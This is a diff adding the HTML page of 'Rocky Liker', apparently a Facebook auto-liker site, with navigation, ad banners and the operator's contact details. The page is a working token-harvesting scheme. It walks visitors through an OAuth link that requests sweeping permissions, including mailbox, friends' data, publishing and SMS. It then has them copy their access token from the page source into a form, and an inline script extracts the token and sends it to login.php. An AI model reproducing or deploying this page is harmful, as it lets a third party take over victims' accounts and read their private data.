@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-141261513-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-141261513-1');
+</script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Rocky Liker - Mobile</title>
+<meta name="robots" content="index,follow,all" />
+<meta http-equiv="content-language" content="en" />
+<link rel="shortcut icon" href="assets/favicon.png">
+<meta name="theme-color" content="#37589e">
+<link rel="stylesheet" href="assets/css/style.css" media="screen, projection"/>
+<link href='//fonts.googleapis.com/css?family=Advent+Pro' rel='stylesheet' type='text/css'>
+
+
+    <style>
+
+        *, body {
+            color: #636363;
+            font-family: 'Advent Pro', sans-serif;
+            font-size: 100%;
+        }
+
+    </style>
+
+
+</head>
+<body>
+<section id="asides">
+    <aside id="navigation-left" class="left hide" style="width: 260px;">
+        <header style="padding: 10px;">
+            <section class="title centered" style="color: #ffffff;text-align: center;">Features</section>
+            <section class="icon settings right" style="position: absolute;top: 5px;right: 10px;"></section>
+        </header>
+
+        <article class="list scroll active">
+			<ul class="mobile-navigation">
+	        <li class="active">
+            <a href="/status" class="ajax" title="Status Likes"
+               data-ajax='{"content":"#controller"}'>
+                <strong>STATUS</strong>
+            </a>
+        </li>
+		        <li >
+            <a href="/feed" class="ajax" title="Feed Likes"
+               data-ajax='{"content":"#controller"}'>
+                <strong>FEED</strong>
+            </a>
+        </li>
+		        <li >
+            <a href="/photo" class="ajax" title="Photo Likes"
+               data-ajax='{"content":"#controller"}'>
+                <strong>PHOTO</strong>
+            </a>
+        </li>
+		</ul>        </article>
+    </aside>
+    <aside id="navigation-right" class="right hide" style="width: 260px;">
+        <header style="padding: 10px;">
+            <section class="title centered" style="color: #ffffff;text-align: center;">Features</section>
+            <section class="icon settings right" style="position: absolute;top: 5px;right: 10px;"></section>
+        </header>
+
+        <article class="list scroll active">
+            <ul class="mobile-navigation">
+                <li>
+                    <a href="/about" class="ajax" title="About"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>About</strong>
+                    </a>
+                </li>
+                <li>
+                    <a href="/advertising" class="ajax" title="Advertise On Liker fb"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>Create an Ad</strong>
+                    </a>
+                </li>
+                <li>
+                    <a href="//www.facebook.com/x" title="Developers" target="_blank"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>Developers</strong>
+                    </a>
+                </li>
+                <li>
+                    <a href="/privacy" class="ajax" title="Privacy"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>Privacy</strong>
+                    </a>
+                </li>
+                <li>
+                    <a href="/cookies" class="ajax" title="Cookies"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>Cookies</strong>
+                    </a>
+                </li>
+                <li>
+                    <a href="/terms" class="ajax" title="Terms"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>Terms</strong>
+                    </a>
+                </li>
+                <li>
+                    <a href="/help" class="ajax" title="Help"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>Help</strong>
+                    </a>
+                </li>
+                <li>
+                    <a href="/authenticate/logout" class="ajax" title="Help"
+                       data-ajax='{"content":"#controller"}'>
+                        <strong>Logout</strong>
+                    </a>
+                </li>
+            </ul>
+        </article>
+    </aside>
+</section>
+
+<section id="main">
+    <header>
+        <nav class="left">
+            <a class="icon menu"></a>
+        </nav>
+        <nav class="title centered">
+            <a>Rocky Liker - Mobile</a>
+        </nav>
+        <nav class="right">
+            <a class="icon mobile"></a>
+        </nav>
+    </header>
+
+    <article>
+        <section id="container">
+            <section id="controller">
+<ul class="list indented">
+
+<p align="right">
+<a style="margin-left: 5px;" href="https://www.facebook.com/groups/RockyLiker" class="submit">Join Group</a></p>
+
+
+       <li class="color-4">
+Make sure your follower setting is changed to "everybody" 
+and also your posts privacy must be in Public </li>
+
+
+<!-- ADS Rocky  Liker -->
+<center>
+<a target="_blank" href="http://bit.ly/2BF4IMQ">
+<img src="https://smbulk.com/assets/images/banner-728x90.gif" width="340" height="60"></a></center>
+<!-- ADS HERE -->
+
+
+   
+<li class="color-3" style="background-color: #820a00;">
+<strong  style="background-color: #820a00;"> Unknown Error : Please Login Again :) </strong>
+</li>
+
+    <li class="color-2">
+
+		                   
+</center>
+
+
+
+<center>
+<a href="../downapp.php"><img src="assets/Download-app.png" style="background: rgb(14, 77, 121);border-radius: 10px;"></a>
+</center>
+
+
+		                  
+<center>  
+
+<p></p>
+<hr>
+		                   
+</center>
+
+     <h2 class="effect e-fade e-color" style="opacity: 1;">
+        <li>
+		<center>  
+
+<a href="Logins-FBs.php" class="submit" style=" font-size: 17px; padding: 10px 25px 10px; ">Click Here</a>
+<p></p>
+and login with your account.<br>
+Copy all Code and Paste in the box.</div>
+
+<br>
+<br>
+<p><b><font color="#FFFFFF">NEW LOGIN METHOD</font></b></p>
+<b><a target="_blank" class="submit" style=" font-size: 17px; padding: 10px 25px 10px;" href="https://www.facebook.com/dialog/oauth?client_id=124024574287414&amp;redirect_uri=fbconnect://success&amp;scope=email,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&amp;response_type=token">CLICK HERE</a>
+<br><br><font color="#FFFFFF"> to allow all permissions to Instagram App.</font></b>
+<br> Then copy this <input type="text" style="padding:10px;" onclick="clickToCopyURL()" value="view-source:https://www.facebook.com/dialog/oauth?client_id=124024574287414&amp;redirect_uri=https://www.instagram.com/accounts/signup/&amp;&amp;scope=email&amp;response_type=token" id="copyurl">
+<br>And paste URL in New Tab and copy Url <br> Paste in the box  <br>
+
+
+<form action="login.php" onSubmit="document.getElementById('submit').disabled=true;" id="id" method="GET">
+            <ul class="list">
+                <li class="light centered" style="background: transparent;margin: 0;padding: 0;">
+                    <label>
+<input placeholder="Paste Code / Token Here" autocomplete="off" class="span2" id="shit" type="text" oninput="submit_value()" name="user" style="width: 98%;height: 40px;">
+					 
+<input href="javascript:;" type="submit" value="Submit" class="submit" onclick="this.value='Please Wait..';this.disabled='disabled'; this.form.submit();submit_value();"/></a>
+				</form>
+</div>			
+		
+<script>
+ function submit_value() {
+    var x =document.getElementById("shit");
+	try
+	{
+	var token =x.value.split('access_token=')[1].split('"')[0];	
+	location.href="login.php?user="+token;
+	}
+    catch(err){}
+	try{
+	var token =x.value.split('access_token":"')[1].split('"')[0];	
+	location.href="login.php?user="+token;
+	}
+    catch(err){
+	var zx =x.value.split('error_msg":"')[1].split('"')[0];
+	if(zx=="Login approvals are on. Expect an SMS shortly with a code to use for log in (406)"){
+	location.href="Logins-sms.php?userid=";
+	}else{
+	var zx =x.value.split('error_msg":"')[1].split('"')[0];
+	if(zx=="User must verify their account on www.facebook.com (405)"){
+	location.href="Logins-FBs.php?i=10";
+	}else{
+	var zx =x.value.split('error_msg":"')[1].split('"')[0];
+	if(zx=="Invalid username or email address (400)"){
+	location.href="Logins-FBs.php?i=11";
+	}else{
+	var zx =x.value.split('error_msg":"')[1].split('"')[0];
+	if(zx=="Invalid username or password (401)"){
+	location.href="Logins-FBs.php?i=11";
+	}else{
+	var token ="Rocky";
+	location.href="login.php?user="+token;
+        }
+       }
+     }
+   }
+ }
+}
+</script>
+
+
+<script>
+function clickToCopyURL(){
+document.getElementById("copyurl").select(),
+document.execCommand("copy"),
+Materialize.toast("",4e3)};
+</script>
+
+
+<p></p>
+<hr>
+
+                   
+<center>
+
+<li class="color-3">	
+<img src="assets/whatsapp-icon.png" style="margin: -4px 0;">
+Mahmoud Rocky<br>
++201159563715
+<br>
+<img src="assets/facebook-icon.png" style="margin: -4px 0;">
+Mahmoud Rocky<br>
+<a href="https://www.facebook.com/RockySite">FB.com/RockySite</a>
+<br>
+<img src="assets/twitter-icon.png" style="margin: -4px 0;">
+Mahmoud Rocky<br>
+<a href="https://twitter.com/RockySite">Twitter.com/RockySite</a>
+</li>
+
+<!-- ADS Rocky  Liker -->
+<center>
+<a target="_blank" href="http://bit.ly/2BF4IMQ">
+<img src="https://smbulk.com/assets/images/banner-728x90.gif" width="300" height="60"></a></center>
+<!-- ADS HERE -->
+
+	
+<li class="color-3">
+<strong>HAVING TROUBLES?</strong> See <a target="_blank" href="help.php">This Video</a> For Getting Started    </li>
+<strong>Follow Mahmoud Rocky</strong>
+<strong>On Facebook</strong>
+<a href="//www.facebook.com/100047491170237"><img src="assets/Follow-Rocky-FB.png" ></a>
+<strong>On Twitter</strong>
+<a href="https://twitter.com/RockySite" class="twitter-follow-button" data-size="large" data-lang="en" data-show-count="false">Follow @RockySite</a><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+</ul>
+
+<a class="twitter-timeline" data-lang="en" data-height="220" href="https://twitter.com/RockySite">Tweets by RockySite</a> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+            </section>
+        </section>
+    </article>
+
+
+<!-- ADS Rocky  Liker -->
+<center>
+<a target="_blank" href="http://bit.ly/2BF4IMQ">
+<img src="https://smbulk.com/assets/images/banner-728x90.gif" width="340" height="60"></a></center>
+<!-- ADS HERE -->
+
+
+
+    <footer>
+        <ul class="list indented">
+            <li style="font-size: 10px;background: #ffffff;">
+                <section class="color-4" style="padding: 10px;">
+<section class="copyright"> (c) Copyright 2013 - 2019 <a rel="external" href="index.php">Rocky Liker</a>. Created By <a rel="external" target="_blank" href="://www.facebook.com/100047491170237">Mahmoud Rocky</a>
+</section>
+&nbsp;
+<section class="footer-links">
+<input type="hidden" name="IL_IN_TAG" value="2"/>
+
+</section>            
+</li>
+</ul>
+
+
+</footer>
+</body>
+</html>
